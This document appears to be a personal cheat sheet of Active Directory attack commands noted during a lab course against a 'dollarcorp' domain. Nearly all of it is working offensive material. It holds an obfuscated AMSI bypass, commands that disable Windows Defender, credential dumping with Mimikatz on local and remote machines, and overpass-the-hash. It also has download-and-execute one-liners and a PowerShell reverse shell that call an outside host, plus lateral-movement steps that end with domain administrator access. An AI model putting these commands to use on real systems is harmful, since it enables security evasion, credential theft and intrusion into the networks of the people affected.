To bypass windows AMSI:

powershell -ep bypass

Bypass AMSI:
PS C:\AD\Tools> sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

Disbale AMSI on remote machine who's session is stored in $sess:
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

Get all domain admins:

Get-NetGroup -GroupName "Domain Admins" -FullData

Tail a file and have a keyword hightlighted:

tail -f alerts.json | perl -pe 's/keyword/\e[1;31;43m$&\e[0m/g'

Get all users with local admin privileges:

net localgroup administrators

Temporarly disable windows defender if you have administrator priveleges:

Set-MpPreference -DisableRealtimeMonitoring $true

To find local admin privelges for your current user using PowerView:

Find-LocalAdminAccess -Verbose

Get a session on the machine on which you have local admin privleges:
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
[dcorp-adminsrv.dollarcorp.moneycorp.local]: PS C:\Users\student536\Documents>

lateral movement using powershell remoting(one to one remoting):
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local #we had admin rights on this box

$sess=New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

One to Many remoting or Fan-out Remoting:
Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -ScriptBlock{whoami;hostname} #For executing commands on multiple remote computers

Invoke-Command -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local -FilePath C:\AD\Tools\PowerUp.ps1 #execute file on adminsrv machine

To find out what language mode is powershell running on:
$ExecutionContext.SessionState.LanguageMode #type in powershell (Constrained language mode or Full language mode)

Dump Credentials on a local machine:
Invoke-Mimikatz -DumpCreds

Dump credentials on multiple remote machines.
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")

Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess #Run mimikatz on remote machine

For user hunting:
Invoke-UserHunter

Invoke-UserHunter -Checkaccess

Reverse shell using Invoke-PowerShellTCP:

powershell.exe iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.X -Port 443 #function name changed to power

powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.36/Invoke-PowerShellTcp.ps1'));Power -Reverse -IPAddress 172.16.100.36 -Port 9001 #this one worked

Dowload Powerview.ps1 and execute in-memory:

iex (iwr http://172.16.100.36:8080/PowerView.ps1 -UseBasicParsing)

Overpass the hash using mimikatz for lateral movement:
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:<ntlm hash goes here> /run:powershell.exe"'

Get access to domain administrator:
PS C:\Windows\system32> whoami #if you tun whoami it will show your current user
dcorp\student536
PS C:\Windows\s3ystem32> Invoke-Command -ScriptBlock{whoami;hostname} -ComputerName dcorp-dc.dollarcorp.moneycorp.local #have to run like this to know if we can execute command as domain admin
dcorp\svcadmin 
dcorp-dc

